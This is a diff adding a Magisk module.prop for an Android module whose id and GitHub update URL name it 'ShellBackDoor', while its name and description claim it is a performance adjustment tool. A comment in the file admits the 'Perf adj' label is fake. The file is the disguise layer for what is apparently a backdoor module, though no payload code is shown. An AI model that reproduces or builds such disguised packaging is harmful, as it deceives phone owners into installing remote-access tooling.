@@ -1,0 +1,9 @@
+id=darker_ShellBackDoor
+name=darker Perf adj
+version=1.0(beta)
+versionCode=1
+author=execute_darker
+description=Android Perf adj.
+updateJson=https://github.com/execute-darker/ShellBackDoor/raw/main/ShellBackDoor_magisk/update.json
+
+# "Perf adj" is Fake, LOL.
